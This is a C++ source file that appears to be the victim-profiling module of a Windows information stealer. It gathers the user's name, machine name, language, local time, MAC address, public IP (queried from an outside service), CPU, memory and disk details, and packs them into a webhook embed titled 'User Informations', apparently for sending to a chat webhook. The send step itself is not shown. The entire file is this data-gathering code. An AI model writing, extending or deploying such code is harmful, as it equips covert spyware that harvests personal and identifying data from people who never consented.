#include "usrinfo.h"

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winsock2.h>
#include <Lmcons.h>
#include <iphlpapi.h>

UserInfo::UserInfo()
{
}

WebhookEmbed UserInfo::Build()
{
    this->AddUsername();
    this->AddTime();
    this->AddLang();
    this->AddPublicIP();
    this->AddMAC();
    this->AddMachineName();
    this->AddSystemInfo();

    this->embed.SetTitle("User Informations");
    this->embed.SetColor(COLOR_0);

    return this->embed;
}

void UserInfo::AddUsername()
{
    char username[UNLEN + 1];
    DWORD usernameSize = UNLEN + 1;

    if (GetUserNameA(username, &usernameSize))
    {
        this->embed.fields["Username"] = std::string(username, usernameSize);
    }
}

void UserInfo::AddMAC()
{
    ULONG nSize = 0;
    MIB_IPADDRTABLE* ip_table = NULL;
    const int localhost = 0x0100007F;

    if (GetIpAddrTable(ip_table, &nSize, 0) == ERROR_INSUFFICIENT_BUFFER) {
        ip_table = (MIB_IPADDRTABLE*)malloc(nSize);
        if (GetIpAddrTable(ip_table, &nSize, 0) == NO_ERROR)
        {
            for (int i = 0; i < ip_table->dwNumEntries; ++i)
            {
                if (localhost != ip_table->table[i].dwAddr)
                {

                    MIB_IFROW iInfo;
                    BYTE byMAC[6] = { 0, 0, 0, 0, 0, 0 };
                    memset(&iInfo, 0, sizeof(MIB_IFROW));
                    iInfo.dwIndex = ip_table->table[i].dwIndex;
                    GetIfEntry(&iInfo);

                    if (MIB_IF_TYPE_ETHERNET == iInfo.dwType)
                    {
                        memcpy(&byMAC, iInfo.bPhysAddr, iInfo.dwPhysAddrLen);
                        char macAddress[18];
                        sprintf(macAddress, "%02x-%02x-%02x-%02x-%02x-%02x", byMAC[0], byMAC[1], byMAC[2], byMAC[3], byMAC[4], byMAC[5]);


                        this->embed.fields["MAC Address"] = std::string(macAddress);
                        return;
                    }
                }
            }
        }
    }

    this->embed.fields["MAC Address"] = "Unknown";
}

void UserInfo::AddPublicIP()
{
    CURL* curl = curl_easy_init();
    if (!curl) return;

    const char* url = "https://api64.ipify.org?format=json";
    curl_easy_setopt(curl, CURLOPT_URL, url);

    std::string httpResponse;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &httpResponse);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        return;
    }

    try {
        json jsonData = json::parse(httpResponse);
        this->embed.fields["Public IP"] = jsonData["ip"].get<std::string>();
    }
    catch (const std::exception& e) {
        curl_easy_cleanup(curl);
        return;
    }

    curl_easy_cleanup(curl);
    return;
}

void UserInfo::AddTime()
{
    auto currentTime = std::chrono::system_clock::now();
    std::time_t currentTimeT = std::chrono::system_clock::to_time_t(currentTime);

    struct std::tm localTime;
    localtime_s(&localTime, &currentTimeT);

    char timeBuffer[100];
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", &localTime);

    this->embed.fields["Local Time"] = std::string(timeBuffer);
}

void UserInfo::AddMachineName()
{
    char machineName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD machineNameSize = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerNameA(machineName, &machineNameSize))
    {
        this->embed.fields["Machine Name"] = machineName;
    }
}

void UserInfo::AddLang()
{
    wchar_t buffer[LOCALE_NAME_MAX_LENGTH] = { 0 };
    if (GetLocaleInfoEx(LOCALE_NAME_USER_DEFAULT, LOCALE_SISO639LANGNAME, buffer, LOCALE_NAME_MAX_LENGTH))
    {
        this->embed.fields["Language"] = HStringToUTF8(buffer);
    }
}

void UserInfo::AddSystemInfo()
{
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    std::stringstream sys;

    this->embed.fields["Processors"] = std::to_string(systemInfo.dwNumberOfProcessors);

    std::string arch = "Unknown";
    switch (systemInfo.wProcessorArchitecture) {
    case PROCESSOR_ARCHITECTURE_AMD64:
        arch = "x64";
        break;
    case PROCESSOR_ARCHITECTURE_ARM:
        arch = "ARM";
        break;
    case PROCESSOR_ARCHITECTURE_ARM64:
        arch = "ARM64";
        break;
    case PROCESSOR_ARCHITECTURE_INTEL:
        arch = "x86";
        break;
    }
    this->embed.fields["Architecture"] = arch;

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);

    this->embed.fields["Total Physical Memory"] = std::to_string(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB";
    this->embed.fields["Available Physical Memory"] = std::to_string(memoryStatus.ullAvailPhys / (1024 * 1024)) + " MB";


    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    GetDiskFreeSpaceExW(NULL, &freeBytesAvailable, &totalBytes, &totalFreeBytes);

    this->embed.fields["Total Disk Space"] = std::to_string(totalBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
    this->embed.fields["Free Disk Space"] = std::to_string(totalFreeBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
}

size_t CurlWriteCallback(void* contents, size_t size, size_t nmemb, std::string* response)
{
    size_t totalSize = size * nmemb;
    response->append((char*)contents, totalSize);
    return totalSize;
}